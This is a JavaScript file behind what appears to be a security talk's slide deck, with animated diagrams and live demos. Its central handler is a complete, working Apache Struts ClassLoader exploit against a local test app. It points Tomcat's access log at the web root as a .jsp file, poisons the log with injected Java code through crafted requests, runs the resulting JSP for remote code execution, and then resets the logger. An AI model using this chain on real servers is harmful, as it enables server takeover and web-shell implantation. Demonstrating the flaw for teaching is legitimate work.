/*global $:false, console:false, Raphael:false */

$(function() {
    $(".urlize").each(function(i, elm) {
        var url = $(elm).text();
        $(elm).text("");
        $("<a>").attr("href", url).text(url).appendTo($(elm));
    });

});

$(function() {
    $("#struts-form1").submit(function(evt) {
        evt.preventDefault(); 
        $("#struts-form1 iframe").attr("src", $("#struts-form1 input[type=text]").val());
    });
});

$(function() {
    function create_data(dir, prefix, suffix, fileDateFormat) {
        return {
            "class['classLoader'].resources.context.parent.pipeline.first.directory" : dir,
            "class['classLoader'].resources.context.parent.pipeline.first.prefix" : prefix,
            "class['classLoader'].resources.context.parent.pipeline.first.suffix" : suffix, 
            "class['classLoader'].resources.context.parent.pipeline.first.fileDateFormat" : fileDateFormat,
            "_" : Date.now()
        };
    }

    $("#struts-form2").submit(function(evt) {
        evt.preventDefault(); 
        var prefix = new Uint8Array(3);
        window.crypto.getRandomValues(prefix);
        prefix = window.btoa.apply(window, prefix).split("=")[0];
        var fd = new Uint8Array(1);
        window.crypto.getRandomValues(fd);
        fd = Math.abs(fd[0]);
        var data = create_data("webapps/ROOT", prefix, ".jsp", fd);
        function clear_classLoader() {
            $("#struts-form2 .logger").text("Reverting log...");

            $.get("http://localhost:28081/Struts-0.0.2-SNAPSHOT/hello.action", create_data("", "", "", ""))
                .always(function() { 
                    $("#struts-form2 .logger").text("Done");
                });    
        }
        $("#struts-form2 .logger").text("Changing logger...");
        $.get("http://localhost:28081/Struts-0.0.2-SNAPSHOT/hello.action", data).success(function() {
            var file = prefix + fd + ".jsp";
            function load(round, cb) {
                if (round == 10) return clear_classLoader();
                $.get("http://localhost:28081/" + file).success(cb).error(function() {
                    load(round+1);
                });
            }
            $("#struts-form2 .logger").text("Waiting for new JSP to work...");
            load(0, function(data) {
                var fileParts = $("#struts-form2 .in")
                  .text()
                  .replace(/(.*)/g, "<% $1 %>")
                  .replace(/<% import (.*); %>/g, '<%@ page import="$1" %>')
                  .split('\n');
                function dump(i, fileData, cb) {
                    if (i >= fileData.length) return cb();
                    $.get("http://localhost:28081/" + fileData[i]).always(function() {
                        dump(i+1, fileData, cb);
                    });
                }
                $("#struts-form2 .logger").text("Adding code to new JSP...");
                dump(0, fileParts, function() {
                    $.get("http://localhost:28081/" + file, { "_" : Date.now() }).success(function() {
                        setTimeout(function() {
                            $("#struts-form2 .logger").text("Loading new jsp...");
                            $.get("http://localhost:28081/" + file, { "_" : Date.now() }).success(function(data) {
                                $("#struts-form2 .result").text("Data:" + data);
                            }).always(clear_classLoader);
                        }, 5000);
                    });
                });
                
            });
        });
    });
});

$(function() {
   

    /*var fig1 = gofigure.create('dds', '780', '450');
    var fig1steps = [
        fig1.box(600, 50, 100, 200),
        fig1.centeredText(650, 270, "Database"),
        fig1.arrow(600, 150, 500, 150, { duration: 200 }),
        fig1.centeredText(550, 167, "SQL"),
        fig1.box(400, 50, 100, 200),
        fig1.centeredText(450, 270, "Server side"),
        fig1.arrow(400, 150, 300, 150, { duration: 200 }),
        fig1.centeredText(350, 167, "text/html"),
        fig1.box(200, 50, 100, 200),
        fig1.centeredText(250, 270, "HTML")
    ];
    fig1.bindClick(fig1steps);
    $("#dds").addClass("to-animate").get(0).steps = fig1steps; */

    var fig2 = gofigure.create('dds2', '780', '450');
    var fig2steps = [
        fig2.box(620, 50, 100, 200),
        fig2.centeredText(670, 270, "Database"),
        fig2.arrow(620, 150, 520, 150, { duration: 200 }),
        fig2.centeredText(570, 167, "SQL"),
        fig2.box(420, 50, 100, 200), 
        fig2.centeredText(470, 270, "Server side"),
        fig2.arrow(420, 150, 320, 150, { duration: 200 }), 
        fig2.centeredText(370, 167, "JSON"),
        fig2.box(220, 50, 100, 200),
        fig2.centeredText(270, 270, "JavaScript"),
        fig2.arrow(220, 150, 120, 150, { duration: 200 }),
        fig2.centeredText(170, 167, "template"),
        fig2.box(20, 50, 100, 200),
        fig2.centeredText(70, 270, "HTML")
    ];
    fig2.bindClick(fig2steps);
    $("#dds2").addClass("to-animate").get(0).steps = fig2steps;


    window.hookSlide = function(slide) {
        var toAnimate = slide.querySelector('.to-animate');
        if (!toAnimate) return false;
        toAnimate.currentStep = (toAnimate.currentStep || 0) + 1;
        if (toAnimate.currentStep > toAnimate.steps.length) return false;
        toAnimate.steps[toAnimate.currentStep - 1].animate();
        return true;
    }

});